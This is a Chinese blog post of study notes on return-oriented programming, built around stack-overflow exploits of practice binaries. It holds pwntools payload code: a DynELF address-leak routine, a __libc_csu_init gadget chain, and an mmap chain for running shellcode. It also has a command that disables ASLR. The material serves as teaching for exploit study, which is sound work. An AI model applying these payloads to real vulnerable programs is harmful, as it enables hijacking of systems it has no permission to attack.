---
layout: post
title: 一步一步学ROP笔记
slug: RopNote
date: 2018-03-28 14:45
status: publish
author: yuri
tags: 
  - pwn
  - ROP
categories:
  - pwn
excerpt: ROP的全称为Return-oriented programming(返回导向编程),这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御(比如DEP, ASLR等).

---

# 一步一步学ROP笔记
> 原文地址: [一步一步学ROP](drops.wooyun.org/tips/6597)

## x86 

### 无保护

* 关掉canary:  **-fno-stack-protector**
* 关掉NX:  **-z execstack**
* 关掉PIE:  **sudo -s echo 0 > /proc/sys/kernel/randomize_va_space**

### 绕过NX

gdb下找`system()`和`"/bin/sh\x00"`的地址:

```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e5f460 <system>
(gdb) print __libc_start_main
$2 = {<text variable, no debug info>} 0xb7e393f0 <__libc_start_main>
(gdb) find 0xb7e393f0, +2200000, "/bin/sh"
0xb7f81ff8
(gdb) x/s 0xb7f81ff8
0xb7f81ff8:  "/bin/sh"
```

### 绕过NX和PIE

* 看plt : **objdump -d -j .plt level2**
* 看got : **objdump -R level2**
* 查看目标程序调用的so库 : **ldd level2**

用pwntools: 

```python
elf = ELF('level2')
plt_write = elf.symbols['write']
got_write = elf.got['write']

libc = ELF('libc.so')
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
```

### 无libc.so

步骤: 
1. 泄露`__libc_start_main`地址
2. 获取`libc`版本
3. 获取`system`地址与`/bin/sh`的地址
4. 再次执行源程序
5. 触发栈溢出执行`system(“/bin/sh”)`

DynELF的使用: 

```python
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

d = DynELF(leak, elf=ELF('./level2'))
system_addr = d.lookup('system', 'libc')
```

------

## x64

### 传参区别

* 前六个参数保存顺序 : **RDI, RSI, RDX, RCX, R8, R9**

### gadgets

* 找ROP:  **ROPgadget --binary level4 --only "pop|ret"**
* 过滤:  **ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi**

### 通用gadgets part1

`__libc_csu_init()`下: 

```bash
.text:0000000000400840                 public __libc_csu_init
.text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:0000000000400840                 push    r15
.text:0000000000400842                 mov     r15d, edi
.text:0000000000400845                 push    r14
.text:0000000000400847                 mov     r14, rsi
.text:000000000040084A                 push    r13
.text:000000000040084C                 mov     r13, rdx
.text:000000000040084F                 push    r12
.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry
.text:0000000000400858                 push    rbp
.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:0000000000400860                 push    rbx
.text:0000000000400861                 sub     rbp, r12
.text:0000000000400864                 xor     ebx, ebx
.text:0000000000400866                 sar     rbp, 3
.text:000000000040086A                 sub     rsp, 8
.text:000000000040086E                 call    _init_proc
.text:0000000000400873                 test    rbp, rbp
.text:0000000000400876                 jz      short loc_400896
.text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400880
.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400880                 mov     rdx, r13
.text:0000000000400883                 mov     rsi, r14
.text:0000000000400886                 mov     edi, r15d
.text:0000000000400889                 call    qword ptr [r12+rbx*8]
.text:000000000040088D                 add     rbx, 1
.text:0000000000400891                 cmp     rbx, rbp
.text:0000000000400894                 jnz     short loc_400880
.text:0000000000400896
.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36j
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn
.text:00000000004008A4 __libc_csu_init endp   
```

因此若要调用`write(1,got_write,8)`, 则可这样构造: 

```python
# rbx必须为0,因为call qword ptr [r12+rbx*8]
# rbp必须为1,0x40088D~0x400894有一个cmp,jnz
# r12 = addr_got,因为call qword ptr [r12+rb1x*8]
# r13 = rdx = arg3
# r14 = rsi = arg2
# r15 = edi = arg1
# retn的padding需要7*8=56byte

# padding
payload1 =  "\x00"*136 
# pop rbx地址_rbx=0_rbp=1_调用函数got_arg1_arg2_arg3
payload1 += p64(0x40089A) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) 
# mov rdx,r13地址(注意看原始汇编)
payload1 += p64(0x400880) 
# padding(7*8=56byte)
payload1 += "\x00"*56
# ret
payload1 += p64(main)
```

此外还有一个x64 gadgets, 就是:

* pop rdi
* ret

的gadgets. 这个gadgets是由opcode错位产生的.

如上的例子中0x4008A2, 0x4008A4两处的字节码如下:

* 0x41 0x5f 0xc3

意思是`pop r15, ret`, 但是恰好`pop rdi, ret`的opcode如下:

* 0x5f 0xc3

因此如果我们指向0x4008A3就可以获得`pop rdi, ret`的opcode, 从而对于单参数函数可以直接获得执行
与此类似的, 还有0x4008A1处的 `pop rsi, pop r15, ret`
那么这个有什么用呢？我们知道x64传参顺序是**rdi, rsi, rdx, rcx**.
所以rsi是第二个参数, 我们可以在rop中配合`pop rdi,ret`来使用`pop rsi, pop r15,ret`, 这样就可以轻松的调用2个参数的函数.
综上, 就是x64下利用通用gadgets调用一个参数, 两个参数, 三个参数函数的方法.

### 通用gadgets part2

`_dl_runtime_resolve()`下**(在内存中的地址是随机的)**: 

```bash
0x7ffff7def200 <_dl_runtime_resolve>:       sub     rsp,0x38
0x7ffff7def204 <_dl_runtime_resolve+4>:     mov     QWORD PTR [rsp],rax
0x7ffff7def208 <_dl_runtime_resolve+8>:     mov     QWORD PTR [rsp+0x8],rcx
0x7ffff7def20d <_dl_runtime_resolve+13>:    mov     QWORD PTR [rsp+0x10],rdx
0x7ffff7def212 <_dl_runtime_resolve+18>:    mov     QWORD PTR [rsp+0x18],rsi
0x7ffff7def217 <_dl_runtime_resolve+23>:    mov     QWORD PTR [rsp+0x20],rdi
0x7ffff7def21c <_dl_runtime_resolve+28>:    mov     QWORD PTR [rsp+0x28],r8
0x7ffff7def221 <_dl_runtime_resolve+33>:    mov     QWORD PTR [rsp+0x30],r9
0x7ffff7def226 <_dl_runtime_resolve+38>:    mov     rsi,QWORD PTR [rsp+0x40]
0x7ffff7def22b <_dl_runtime_resolve+43>:    mov     rdi,QWORD PTR [rsp+0x38]
0x7ffff7def230 <_dl_runtime_resolve+48>:    call    0x7ffff7de8680 <_dl_fixup>
0x7ffff7def235 <_dl_runtime_resolve+53>:    mov     r11,rax
0x7ffff7def238 <_dl_runtime_resolve+56>:    mov     r9,QWORD PTR [rsp+0x30]
0x7ffff7def23d <_dl_runtime_resolve+61>:    mov     r8,QWORD PTR [rsp+0x28]
0x7ffff7def242 <_dl_runtime_resolve+66>:    mov     rdi,QWORD PTR [rsp+0x20]
0x7ffff7def247 <_dl_runtime_resolve+71>:    mov     rsi,QWORD PTR [rsp+0x18]
0x7ffff7def24c <_dl_runtime_resolve+76>:    mov     rdx,QWORD PTR [rsp+0x10]
0x7ffff7def251 <_dl_runtime_resolve+81>:    mov     rcx,QWORD PTR [rsp+0x8]
0x7ffff7def256 <_dl_runtime_resolve+86>:    mov     rax,QWORD PTR [rsp]
0x7ffff7def25a <_dl_runtime_resolve+90>:    add     rsp,0x48
0x7ffff7def25e <_dl_runtime_resolve+94>:    jmp     r11
```

* 可以通过函数的PLT确定`_dl_runtime_resolve()`地址, 其中`PLT[2]`中跳转的地址就是`_dl_runtime_resolve()`地址
* 要利用这个gadget, 我们还需要控制rax的值, 因为gadget是通过rax跳转的:
  ```bash
  0x7ffff7def235 <_dl_runtime_resolve+53>:    mov    r11,rax
  ...
  0x7ffff7def25e <_dl_runtime_resolve+94>:    jmp    r11
  ```
------

## 利用mmap执行任意shellcode

mmap或者mprotect将某块内存改成RWX, 然后将shellcode保存到这块内存, 然后控制pc跳转过去就可以执行任意的shellcode了.

```python
# mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)
# 参数传递从linker_addr + 0x35开始
# 需要先pop rax,ret,且使rax=mmap_addr
# r9,r8,rdi,rsi,rdx,rcx,rax
# 最后需要(0x48-8*6)/8 = 3Byte padding
payload3 =  "\x00"*136
payload3 += p64(pop_rax_ret) + p64(mmap_addr)
payload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0) 
```